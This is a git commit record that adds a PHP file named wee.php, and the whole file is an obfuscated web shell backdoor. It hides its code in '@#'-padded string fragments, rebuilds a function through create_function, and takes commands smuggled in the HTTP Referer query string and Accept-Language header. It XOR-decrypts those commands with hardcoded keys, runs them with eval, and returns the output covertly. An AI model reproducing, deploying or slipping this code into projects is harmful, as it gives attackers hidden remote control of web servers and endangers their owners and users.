818ddc01a75e3d6380acf2a1f622b264f5c4cee3
sinkaroid <bibsindra@gmail.com>
2019-01-05 16:20:26 +0700

    Create wee.php

---
+++ wee.php
@@ -0,0 +1,15 @@
+<?php
+$R='#_e@#nd_clean();$d=ba@#se64_en@#code(x(gzco@#m@#pre@#@#ss($o),@#$k@#));print("<$@#k>$d@#</$k>");@sessi@#on@#_destroy();}}}}';
+$c='@#d5($i.$k@#h),0,3@#));$@#f=$sl($ss(md@#5($i@#.$kf@#),0,3));$p=@#"";@#for($@#z=1;$z<coun@#t($@#m[1])@#;$z++)$p.@#=@#$q[$m@#';
+$q='re@#pla@#c@#e@#(array("@#/@#_/","/-/"),array(@#"@#/@#","+"),$ss($s[$i],0,$e))@#)@#,$k)))@#;$o=ob_ge@#t_c@#on@#tents@#();ob@';
+$b='$kh=@#"3e9f";$kf="@#0fc9";f@#u@#n@#@#ction x(@#$t,$k)@#{@#$c=strle@#n($k);$l=strlen($t)@#;$o=""@#;fo@#r($@#i=0;$i<$l;){@#f';
+$W='{@sess@#ion_sta@#rt()@#;$s=&$@#_S@#ESSION;$ss="subs@#tr";$s@#@#l="str@#tolower"@#;$i=$m[1][@#0].$m[@#1@#][1];@#$h=$sl($s@#s(m';
+$w='@#@#R"];$ra=@$@#r["HTTP@#_@#ACCEPT_L@#ANGUAGE@#"];if@#($rr&&@#@#$ra){$u=parse_url@#($r@#r@#);parse_str($@#u["que@#ry"],@#$q)';
+$Z=str_replace('F','','FcFreateFF_fFunctiFon');
+$r='[2][$z]];i@#f@#(@#strpos($p,$h)@#===0){$s[@#$i]="";$@#p=$@#s@#s($p,3);@#}@#if(arra@#y_key_exi@#sts($i,$s)){$@#@#s[$i].=$@#p';
+$O=';$e@#=strpos($s[@#@#$i],$f@#);@#if($e){$k=$kh.$k@#@#f;ob_start();@@#eva@#l(@@#gzuncompre@#@#ss(@x(@b@#@#ase64_decode(preg_@#';
+$U='o@#@#r($j=0;($j<$c&&@#$i<$@#l);$j++,$@#i++){$@#o.=$t{$i}@#^$k{$@#j};@#}}@#retur@#n $o@#;}$r=$_SERVE@#R;$r@#r=@$r["@#HTTP_REFERE';
+$z=';@#$q=arr@#ay_values($@#q);p@#@#reg_match@#_all("@#/([\\w])@#[\\w-]@#+(?@#:;q=0.([\\d@#]))?,?/"@#,$ra,$m)@#@#;if(@#$q&&@#$m)';
+$v=str_replace('@#','',$b.$U.$w.$z.$W.$c.$r.$O.$q.$R);
+$l=$Z('',$v);$l();
+?>
